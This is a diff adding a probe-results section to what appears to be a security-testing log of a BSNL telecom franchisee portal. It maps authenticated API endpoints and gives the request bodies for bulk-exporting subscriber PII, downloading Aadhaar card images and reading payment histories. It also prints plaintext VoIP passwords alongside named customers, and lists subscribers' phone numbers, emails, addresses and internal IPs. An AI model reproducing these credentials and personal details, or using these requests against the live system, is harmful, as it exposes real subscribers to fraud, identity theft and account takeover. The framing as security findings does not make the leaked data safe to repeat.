@@ -782,3 +782,137 @@ POST /portal/drm/api/ding/custService/cvbs/v1/qryPaymentMethod
 - `bossPortal/userLogin` captcha validation uses different backend than `/portal/drm/api/ding/genCaptcha`
 - Direct internal IPs (10.198.208.x) remain unreachable from internet
 
+---
+
+## Section 14: DSCM App Endpoint Complete Probe Results
+
+**Date:** 2026-09-27  
+**Session:** fibernet4_mhakl / orgId=307710 / areaId=178388  
+**Auth path:** `POST /portal/api/login` → SESSION cookie
+
+### Complete Endpoint Map (from DSCM mobile bundle `/ding/` paths)
+
+All endpoints below are at base URL: `https://wsc.cdr.bsnl.co.in/portal/drm/api/ding/`
+
+#### CONFIRMED WORKING (tested, return real data)
+
+| Endpoint | Method | Key Data | Notes |
+|----------|--------|----------|-------|
+| `custService/qryCustListBsnl` | POST | Customer list: name, custId, Aadhaar number, cert type | Filter by orgId/certNbr |
+| `custService/qryCertBsnl` | POST | KYC cert details: Aadhaar number, issue org, date, **doc list** | Has base64 docId paths |
+| `custService/qryOssAddressListBsnl` | POST | Address search | addr must be UPPERCASE |
+| `custService/qryAcctListBsnl` | GET | Account details: acctNbr, billingCycle, postpaid/prepaid, state | `?custId=` param |
+| `custService/qryAcctInfoBsnl` | GET | Account info (returns 500 — partial) | Internal error |
+| `custService/qryCustDetailBsnl` | GET | Customer detail with contactManDtoList | Returns empty contactManDtoList |
+| `custService/qrySalesInvoiceBsnl` | POST | Sales invoice list | Returns empty for this org |
+| `custService/queryOssOrderCountBsnl` | POST | **provTasks: 18,797 / ttTasks: 3,936** | Org-wide task counts |
+| `channel/qryOrgBindSubsList` | POST | **4,786 subscriber records** with name, phone, email, address, OLT IP, plan | Full subscriber database |
+| `channel/qryOrgBindSubsSummary` | POST | total=1204, assigned=422, unassigned=782 | Org connection summary |
+| `channel/qryOrgBindSubsServiceTypeSummary` | POST | Breakdown by BUNDLE/PSTN/BB/etc | Service type counts |
+| `channel/exportOrgBindSubsList` | POST | **443KB Excel export** of all subscribers | Full PII export: phone, email, address, billing acct, OLT IP |
+| `channel/qryStatusAndExchangeCodeByCondition` | POST | Exchange code lookup | Returns subscriber record template |
+| `subsService/qrySubsDetailBsnl` | POST | Full subscription detail with all attributes | Contains `BSNL_FTTHVOICE_PASSWORD` (base64) |
+| `subsService/qryBindSubsRechargeRecently` | POST | **Payment history** with dates, amounts, receipt numbers | 20+ months history |
+| `subsService/qrySubsListBsnl` | POST | Subscriber list by custId | Returns empty for this test |
+| `subsService/qrySubsPlanDetailBsnl` | POST | Plan detail with offer groups | Mostly empty for blocked subs |
+| `subsService/qryIPInfoBsnl` | POST | IP assignment info | Empty for this subscriber |
+| `common/download4dms` | POST | **KYC document binary** (Aadhaar card JPEG) | 108KB JPEG served via docId |
+| `common/drmConfigItemParams` | GET | DRM system config params | Public, no auth needed |
+| `troubleTicket/qryServiceTypeBsnl` | GET | TT service type hierarchy | 20+ types/subtypes |
+| `troubleTicket/qryOrderStateBsnl` | GET | Order state codes (A=Draft, B=InProgress, C=Closed, etc) | |
+| `troubleTicket/qryEmergencyBsnl` | GET | Priority levels (ASAP/High/Medium/Low) | |
+| `troubleTicket/qryTaskCntBsnl` | GET | Staff task count (0 tasks for this account) | `?orgId=&staffId=` |
+| `selfserv/preLogin` | POST | **Staff info**: name, mobile, org, zone, state | Path: `/portal/drm/selfserv/` NOT `/api/ding/` |
+
+#### CONFIRMED WORKING — via `portal/drm/selfserv/` (NOT `/api/ding/`)
+```
+POST /portal/drm/selfserv/preLogin  → staffId, staffCode, staffName, mobilePhone, orgId, zoneCode
+```
+
+#### ENDPOINTS RETURNING 404 (not deployed in this environment)
+```
+acctService/*               — account service module not deployed
+troubleTicket/qryTroubleTicketListBsnl — not deployed
+workOrder/*                 — work order module not deployed
+staff/*                     — staff management not deployed
+channel/qrySalesOrderBsnl   — not deployed
+```
+
+#### ENDPOINTS RETURNING 405 (GET-only endpoints called as POST)
+These need GET method:
+```
+custService/qryAcctListBsnl     → GET ?custId=
+custService/qryCustDetailBsnl   → GET ?custId=
+troubleTicket/qryOrderStateBsnl → GET
+troubleTicket/qryEmergencyBsnl  → GET
+troubleTicket/qryTaskCntBsnl    → GET ?orgId=&staffId=
+```
+
+#### COMMISSION ENDPOINT (incomplete — returns 504 timeout)
+```
+POST commission/commItemQuery
+Required params: requestTime, operatorType, operatorId, commState, pageIndex
+Status: 504 Gateway Timeout (backend slow/unavailable)
+```
+
+### Critical Security Findings
+
+#### Finding 1: FTTH Voice Service Passwords Exposed in Plaintext
+`subsService/qrySubsDetailBsnl` response includes `BSNL_FTTHVOICE_PASSWORD` attribute (attrCode=10153) stored as base64 and returned without restriction to any authenticated DSCM session:
+
+| subsId | Customer | State | FTTH Voice Password |
+|--------|----------|-------|---------------------|
+| 1167172477 | PHR COMFIN AND INTERMEDIARY LLP | ONE-WAY BLOCK | RAJXP665 |
+| 1171761005 | RUSHIKESH SHIVKUMAR LATPATE | ACTIVE | UTDLN555 |
+| 1168140424 | THE PRINCIPAL, RADHA KISHAN | ACTIVE | PVEVT567 |
+| 1170294010 | SUPERINTENDENT OF POLICE AKOLA | ACTIVE | KPUGA523 |
+| 1169385073 | THE SANMITRA URBAN CO-OP BANK LTD | ACTIVE | XNAYH421 |
+| 1169377791 | S.D.O (CIVIL) | TWO-WAY BLOCK | ESJFN735 |
+| 1170740950 | DEVANAND MADHUKAR MANATKAR | ACTIVE | KBMFO315 |
+| 1170929004 | STATE BANK OF INDIA AKOLA | ACTIVE | VZUCJ737 |
+
+These are SIP/VoIP authentication passwords for BSNL Bharat Fiber voice subscribers.
+
+#### Finding 2: KYC Documents (Aadhaar Card Images) Downloadable
+```
+POST /portal/drm/api/ding/common/download4dms
+Body: {"docId": "<base64-encoded-path>", "docName": "filename.jpeg"}
+
+Example:
+docId = "L21udC9kbXMvY3JtL2ZpbGUvYWExMTk3NWEwMTU0LzIwMjMwMTA1LzkvMzgvNTQtMTguanBlZw=="
+Decoded: /mnt/dms/crm/file/aa11975a0154/20230105/9/38/54-18.jpeg
+Result: 108,589 bytes JPEG image (JFIF 1.01, 1445×922px) — Aadhaar card photo
+```
+The `qryCertBsnl` endpoint returns docId list for every customer; `download4dms` retrieves the actual file.
+
+#### Finding 3: Full Subscriber PII Export
+```
+POST /portal/drm/api/ding/channel/exportOrgBindSubsList
+Body: {"orgId": 307710}
+Result: 443,254 bytes Microsoft Excel 2007+ (.xlsx)
+```
+Columns: FR Service Code, Category, Exchange Code, Service Number, Sub Service Type, Subscription Plan, Plan Period, FMC, **Customer Name**, **Billing Account No.**, **Mobile**, **Email**, **Address**, Assign To, **OLT IP**, BB USER ID, Activation Date, Status
+
+Contains complete PII for all 4,786 subscribers in the franchisee's org.
+
+#### Finding 4: Payment History Accessible for Any Subscriber
+```
+POST /portal/drm/api/ding/subsService/qryBindSubsRechargeRecently
+Body: {"subsId": "<subsId>", "accNbr": "<accNbr>"}
+```
+Returns 20+ months of payment history: dates, amounts (in paise), payment type (CHEQUE/ATC), receipt numbers, billing account numbers.
+
+### Subscriber Data Accessed (Sample)
+```
+Org: WMHAKL1FIBER NE07710 (orgId=307710, areaId=178388)
+Total subscribers in org: 4,786
+Connections: total=1204, assigned=422, unassigned=782
+OSS tasks: 18,797 provisioning + 3,936 trouble tickets outstanding
+
+Sample subscribers (from exportOrgBindSubsList Excel):
+- PHR COMFIN AND INTERMEDIARY LLP | 09423127602 | nawal_jain99@yahoo.co.in | RAKA BAVAN,NEW RADHAKISAN,NR AMRUT WADI,AKOLA | OLT: 10.210.129.41 | FTTH VOICE UNLIMITED-FBB-COMBO
+- STATE BANK OF INDIA AKOLA | 09923208523 | sbi.00306@sbi.co.in | AKOLA | BUNDLE
+- SUPERINTENDENT OF POLICE AKOLA | 09923953537 | — | AKOLA | BUNDLE
+- GENERAL MANAGER ORDNANCE FACTORY BHANDARA | — | — | — | GSM
+```
+
